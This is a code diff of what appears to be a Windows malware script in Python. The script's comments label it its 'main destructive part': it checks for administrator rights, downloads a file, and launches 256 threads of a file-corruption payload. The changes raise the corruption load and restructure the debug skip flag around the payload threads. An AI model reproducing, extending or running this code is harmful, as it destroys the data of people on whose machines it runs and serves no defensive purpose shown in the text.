@@ -7,13 +7,12 @@ import threading
 from functions import *
 
 #Variables
-#inten = 8*1000 #corruption intensity ##Unused
 debug = True #console log stuff
 do_destruction = False
-skipCorruption = False
+skipCorruption = True
 admCheck = ctypes.windll.shell32.IsUserAnAdmin()
 threadAmount = 256
-pcLoadAmount = 819
+pcLoadAmount = 3200
 
 
 
@@ -32,7 +31,6 @@ if debug:
 # Main destructive part
 # does destruction if flag is true
 if do_destruction:
-    #so termination signal works correctly    
     #downloads file
     ufck()
 
@@ -48,19 +46,18 @@ if do_destruction:
         print('failed to get permissions')
 
     # debug thing to skip file corruption
-    if not(skipCorruption):
-        #main shit
-        #bunch of threads for corruption payload to go faster
-        threadList = []
-        for thread in range(threadAmount):
-            thr = threading.Thread(target=fileCorruptionPload, args=(admCheck, debug, round(pcLoadAmount/threadAmount), thread))
-            threadList.append(thr)
-            thr.start()
-            print('Started thread with id:' + str(thread))
+    #main shit
+    #bunch of threads for corruption payload to go faster
+    threadList = []
+    for thread in range(threadAmount):
+        thr = threading.Thread(target=fileCorruptionPload, args=(admCheck, debug, round(pcLoadAmount/threadAmount), thread, skipCorruption))
+        threadList.append(thr)
+        thr.start()
+        print('Started thread with id:' + str(thread))
 
-        # wait for payload to finish
-        for thr in threadList:
-            thr.join()
+    # wait for payload to finish
+    for thr in threadList:
+        thr.join()
 
 
 #region final step
